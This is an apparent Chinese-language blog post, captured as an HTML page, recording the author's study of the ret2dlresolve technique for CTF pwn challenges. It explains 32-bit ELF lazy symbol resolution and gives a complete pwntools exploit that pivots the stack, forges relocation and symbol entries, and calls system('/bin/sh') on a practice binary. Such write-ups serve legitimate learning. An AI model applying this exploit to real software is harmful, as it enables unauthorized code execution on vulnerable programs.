@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>pwn初学者的进阶（二）：ret2dlresolve学习记录 - zyleo&#39;s blog</title><meta name="Description" content=""><meta property="og:title" content="pwn初学者的进阶（二）：ret2dlresolve学习记录" />
+<meta property="og:description" content="花了一个上午时间，看了一下ret2dlresolve的基本原理与基本的利用过程。觉得步骤与相关细节要素还是蛮多的，为防止今后某一天再用到的时候忘得干干净净，特此记录一些我个人的理解，加深印象。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://liuliuliuzy.github.io/posts/2021-09-02-ret2dlresolve%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-09-02T14:03:58+08:00" />
+<meta property="article:modified_time" content="2021-09-02T14:03:58+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="pwn初学者的进阶（二）：ret2dlresolve学习记录"/>
+<meta name="twitter:description" content="花了一个上午时间，看了一下ret2dlresolve的基本原理与基本的利用过程。觉得步骤与相关细节要素还是蛮多的，为防止今后某一天再用到的时候忘得干干净净，特此记录一些我个人的理解，加深印象。"/>
+<meta name="application-name" content="zyleo">
+<meta name="apple-mobile-web-app-title" content="zyleo"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://liuliuliuzy.github.io/posts/2021-09-02-ret2dlresolve%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" /><link rel="prev" href="https://liuliuliuzy.github.io/posts/2021-08-27-buuctf-pwn-fmtstr/" /><link rel="next" href="https://liuliuliuzy.github.io/posts/2021-09-06-buuctf%E5%A0%86%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "pwn初学者的进阶（二）：ret2dlresolve学习记录",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/liuliuliuzy.github.io\/posts\/2021-09-02-ret2dlresolve%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95\/"
+        },"genre": "posts","keywords": "CTF, pwn, 栈","wordcount":  2306 ,
+        "url": "https:\/\/liuliuliuzy.github.io\/posts\/2021-09-02-ret2dlresolve%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95\/","datePublished": "2021-09-02T14:03:58+08:00","dateModified": "2021-09-02T14:03:58+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "zyleo"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : '' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="zyleo&#39;s blog">zyleo&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/"> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="zyleo&#39;s blog">zyleo&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="">关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">pwn初学者的进阶（二）：ret2dlresolve学习记录</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://github.com/liuliuliuzy" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>zyleo</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-09-02">2021-09-02</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 2306 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 5 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x00-dlresolve原理">0x00 dlresolve原理</a></li>
+    <li><a href="#0x01-攻击方法">0x01 攻击方法</a></li>
+    <li><a href="#参考链接">参考链接：</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>花了一个上午时间，看了一下ret2dlresolve的基本原理与基本的利用过程。觉得步骤与相关细节要素还是蛮多的，为防止今后某一天再用到的时候忘得干干净净，特此记录一些我个人的理解，加深印象。</p>
+<h2 id="0x00-dlresolve原理">0x00 dlresolve原理</h2>
+<p>以下内容是32位x86平台相关，64位的ret2dlresolve我还没看。</p>
+<p>这一部分内容需要记住的就是符号解析的过程，也是dlresolve执行的过程，同时也是ret2dlresolve生效的核心原理。</p>
+<p>在符号解析过程中，有三种数据结构：<code>ELF32_Rel</code>、<code>ELF32_sym</code>、<code>.dynstr中的字符串</code>，分别位于<code>.rel.plt</code>、<code>.dynsym</code>、<code>.dynstr</code>节（section），查看这些节的命令为</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">readelf -S elf_name
+</code></pre></td></tr></table>
+</div>
+</div><p>在程序第一次调用某个函数时，关于plt处指令以及push操作什么的就不细说了，我认为整个流程大致可以这么理解：</p>
+<ul>
+<li>
+<p><code>func@plt</code>处的指令相当于先push一个<code>offset</code>值，然后调用<code>plt[0]</code>处的指令，这条指令相当于执行<code>_dl_runtime_resolve(link_map_obj, reloc_index)</code>，这里的<code>reloc_index</code>就是前面<code>func@plt</code>push的<code>offset</code></p>
+</li>
+<li>
+<p>接下来就是三步走了，从函数原型<code>_dl_runtime_resolve(link_map_obj, reloc_index)</code>出发，根据<code>reloc_index</code>（相对于<code>.rel.plt</code>的字节偏移量，单位：字节）找到<code>.rel.plt</code>中的<code>ELF32_Rel</code>对象（大小为8字节），其中记录了一个<code>r_info</code></p>
+</li>
+<li>
+<p>再根据<code>r_info</code>（相对于<code>.dynsym</code>的索引，单位：0x10字节）找到<code>.dynsym</code>中的<code>ELF32_sym</code>类型对象（大小为0x10字节）</p>
+</li>
+<li>
+<p>再根据<code>ELF32_sym</code>中的<code>st_name</code>字段（相对于<code>.synstr</code>的字节偏移量，单位：字节），找到<code>.dynstr</code>中的字符串，也就是函数名（正常执行流程是这样的），然后dlresolve从libc中查找，再计算实际地址，将其填入<code>ELF32_Rel</code>对象中的<code>r_offset</code>字段&hellip;</p>
+</li>
+</ul>
+<p>整个流程概括起来就是，<code>func@plt</code>给<code>_dl_runtime_resolve</code>传参数，<code>_dl_runtime_resolve</code>根据其参数去查询上面的那几个表获取函数名称，然后对libc进行解析，获取实际地址，写入got表。</p>
+<h2 id="0x01-攻击方法">0x01 攻击方法</h2>
+<p>感觉很多题都可以栈迁移，再加上如果<code>.bss</code>段可写的话，我们就可以控制将函数栈迁移到自己构造的栈上。</p>
+<p>于是，最常规的攻击步骤就是：</p>
+<ul>
+<li>栈迁移，然后调用<code>plt[0]</code>处指令</li>
+<li>控制栈上的参数（对于<code>_dl_runtime_resolve</code>而言），以及想要调用的函数的参数（比如<code>system</code>）</li>
+<li>再在栈上构造对应该参数的<code>ELF32_Rel</code>类型对象</li>
+<li>再在栈上构造对应<code>ELF32_Rel</code>中<code>r_info</code>的<code>ELF32_sym</code>类型对象</li>
+<li>再在栈上构造对应于<code>ELF32_sym</code>中<code>st_name</code>的字符串</li>
+</ul>
+<p>所以一个典型的exp为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./parelro_x86&#39;</span><span class="p">)</span>
+<span class="n">offset</span> <span class="o">=</span> <span class="mi">112</span>
+<span class="n">read_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span>
+
+<span class="n">ppp_ret</span> <span class="o">=</span> <span class="mh">0x08048619</span> <span class="c1"># ROPgadget --binary bof --only &#34;pop|ret&#34;</span>
+<span class="n">pop_ebp_ret</span> <span class="o">=</span> <span class="mh">0x0804861b</span> <span class="c1"># ROPgadget --binary parelro_x86 | grep &#39;pop ebp ; ret&#39;</span>
+<span class="n">leave_ret</span> <span class="o">=</span> <span class="mh">0x08048458</span> <span class="c1"># ROPgadget --binary bof --only &#34;leave|ret&#34;</span>
+
+<span class="n">stack_size</span> <span class="o">=</span> <span class="mh">0x800</span>
+<span class="n">bss_addr</span> <span class="o">=</span> <span class="mh">0x0804a040</span> <span class="c1"># readelf -S bof | grep &#34;.bss&#34;</span>
+<span class="n">plt_0</span> <span class="o">=</span> <span class="mh">0x08048380</span> <span class="c1"># objdump -d -j .plt bof  执行 &lt;push link_map，jmp dl_resolve&gt;</span>
+<span class="n">rel_plt</span> <span class="o">=</span> <span class="mh">0x08048330</span> <span class="c1"># objdump -s -j .rel.plt bof</span>
+
+<span class="c1"># 栈迁移的目的地</span>
+<span class="n">base_stage</span> <span class="o">=</span> <span class="n">bss_addr</span> <span class="o">+</span> <span class="n">stack_size</span>
+
+<span class="n">index_offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">base_stage</span> <span class="o">+</span> <span class="mi">28</span><span class="p">)</span> <span class="o">-</span> <span class="n">rel_plt</span> <span class="c1"># base_stage + 28指向fake_reloc，减去rel_plt即偏移</span>
+<span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
+<span class="n">dynsym</span> <span class="o">=</span> <span class="mh">0x080481d8</span>
+<span class="n">dynstr</span> <span class="o">=</span> <span class="mh">0x08048278</span>
+
+<span class="c1"># fake_sym_addr 地址按照0x10字节对齐</span>
+<span class="n">fake_sym_addr</span> <span class="o">=</span> <span class="n">base_stage</span> <span class="o">+</span> <span class="mi">36</span>
+<span class="n">align</span> <span class="o">=</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="p">((</span><span class="n">fake_sym_addr</span> <span class="o">-</span> <span class="n">dynsym</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">)</span> <span class="c1"># 这里的对齐操作是因为dynsym里的Elf32_Sym结构体都是0x10字节大小</span>
+<span class="n">fake_sym_addr</span> <span class="o">=</span> <span class="n">fake_sym_addr</span> <span class="o">+</span> <span class="n">align</span>
+
+<span class="n">index_dynsym</span> <span class="o">=</span> <span class="p">(</span><span class="n">fake_sym_addr</span> <span class="o">-</span> <span class="n">dynsym</span><span class="p">)</span> <span class="o">//</span> <span class="mh">0x10</span> <span class="c1"># 除以0x10因为Elf32_Sym结构体的大小为0x10，得到write的dynsym索引号</span>
+<span class="n">r_info</span> <span class="o">=</span> <span class="p">(</span><span class="n">index_dynsym</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x7</span> <span class="c1"># 要满足：ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT，即最低字节要为7</span>
+<span class="n">fake_reloc</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">r_info</span><span class="p">)</span>
+<span class="n">st_name</span> <span class="o">=</span> <span class="p">(</span><span class="n">fake_sym_addr</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">-</span> <span class="n">dynstr</span> <span class="c1"># 加0x10因为Elf32_Sym的大小为0x10</span>
+<span class="n">fake_sym</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">st_name</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x12</span><span class="p">)</span>
+
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./parelro_x86&#39;</span><span class="p">)</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Welcome to XDCTF2015~!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">offset</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">read_plt</span><span class="p">)</span> <span class="c1"># 读100个字节到base_stage</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">ppp_ret</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">base_stage</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_ebp_ret</span><span class="p">)</span> <span class="c1"># 把base_stage pop到ebp中</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">base_stage</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">leave_ret</span><span class="p">)</span> <span class="c1"># mov esp, ebp ; pop ebp ;将esp指向base_stage</span>
+<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">cmd</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh&#34;</span>
+
+<span class="c1"># stage3: </span>
+<span class="c1"># 栈迁移，调plt[0]，传入伪造的 index_offset，指向我们自定义的.rel.plt表项内容</span>
+<span class="c1"># 并且控制r_info，指向我们伪造的.dynsym表项；再控制.dynsym表项中的st_name，指向我们控制的.dynstr表项内容</span>
+<span class="c1"># --------&gt; base_stage</span>
+<span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;AAAA&#39;</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">plt_0</span><span class="p">)</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">index_offset</span><span class="p">)</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;AAAA&#39;</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">base_stage</span> <span class="o">+</span> <span class="mi">80</span><span class="p">)</span> <span class="c1"># 对应system(&#39;/bin/sh&#39;)</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="c1"># 后面的2个参数不需要了</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
+<span class="c1"># (base_stage+28)的位置</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">fake_reloc</span>
+<span class="c1"># (base_stage+36)的位置</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;B&#39;</span> <span class="o">*</span> <span class="n">align</span>
+<span class="c1"># (fake_sym_addr)的位置</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">fake_sym</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;system</span><span class="se">\x00</span><span class="s2">&#34;</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">80</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload2</span><span class="p">))</span>
+<span class="c1"># base_stage + 80</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">cmd</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">100</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload2</span><span class="p">))</span>
+<span class="c1"># payload2结束，刚好100字节</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>写一遍下来，感觉在没有完完全全弄透彻的情况下，通过文字描述清晰还是比较难的，但也只能先这样了😶</p>
+<h2 id="参考链接">参考链接：</h2>
+<ul>
+<li>《ctf竞赛权威指南(pwn篇)》&ndash;$10.6:ret2dl-resolve</li>
+<li><a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/" target="_blank" rel="noopener noreffer">Return-to-dl-resolve</a> （复现平台：ubuntu16）</li>
+<li><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/" target="_blank" rel="noopener noreffer">CTF Wiki: ret2dlresolve</a></li>
+<li><a href="https://bbs.pediy.com/thread-266769.htm" target="_blank" rel="noopener noreffer">[原创]高级栈溢出之ret2dlresolve详解(x86&amp;x64)，附源码分析</a> （和上两篇博文差不多，但是_dl_runtime_resolve()的执行过程写得很清晰，给作者点个赞）</li>
+</ul></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2021-09-02</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/posts/2021-09-02-ret2dlresolve%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/index.md" target="_blank">阅读原始文档</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://liuliuliuzy.github.io/posts/2021-09-02-ret2dlresolve%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" data-title="pwn初学者的进阶（二）：ret2dlresolve学习记录" data-hashtags="CTF,pwn,栈"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://liuliuliuzy.github.io/posts/2021-09-02-ret2dlresolve%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" data-hashtag="CTF"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="分享到 WhatsApp" data-sharer="whatsapp" data-url="https://liuliuliuzy.github.io/posts/2021-09-02-ret2dlresolve%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" data-title="pwn初学者的进阶（二）：ret2dlresolve学习记录" data-web><i class="fab fa-whatsapp fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="https://liuliuliuzy.github.io/posts/2021-09-02-ret2dlresolve%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" data-title="pwn初学者的进阶（二）：ret2dlresolve学习记录"><i data-svg-src="/lib/simple-icons/icons/line.min.svg"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://liuliuliuzy.github.io/posts/2021-09-02-ret2dlresolve%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" data-title="pwn初学者的进阶（二）：ret2dlresolve学习记录"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Myspace" data-sharer="myspace" data-url="https://liuliuliuzy.github.io/posts/2021-09-02-ret2dlresolve%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" data-title="pwn初学者的进阶（二）：ret2dlresolve学习记录" data-description=""><i data-svg-src="/lib/simple-icons/icons/myspace.min.svg"></i></a><a href="javascript:void(0);" title="分享到 Blogger" data-sharer="blogger" data-url="https://liuliuliuzy.github.io/posts/2021-09-02-ret2dlresolve%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" data-title="pwn初学者的进阶（二）：ret2dlresolve学习记录" data-description=""><i class="fab fa-blogger fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="https://liuliuliuzy.github.io/posts/2021-09-02-ret2dlresolve%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" data-title="pwn初学者的进阶（二）：ret2dlresolve学习记录"><i class="fab fa-evernote fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/ctf/">CTF</a>,&nbsp;<a href="/tags/pwn/">Pwn</a>,&nbsp;<a href="/tags/%E6%A0%88/">栈</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/2021-08-27-buuctf-pwn-fmtstr/" class="prev" rel="prev" title="pwn初学者的进阶（一）：格式化字符串"><i class="fas fa-angle-left fa-fw"></i>pwn初学者的进阶（一）：格式化字符串</a>
+            <a href="/posts/2021-09-06-buuctf%E5%A0%86%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95/" class="next" rel="next" title="pwn初学者的进阶（三）：堆学习">pwn初学者的进阶（三）：堆学习<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="disqus_thread" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://disqus.com/?ref_noscript">Disqus</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.88.1">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/liuliuliuzy" target="_blank">zyleo</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
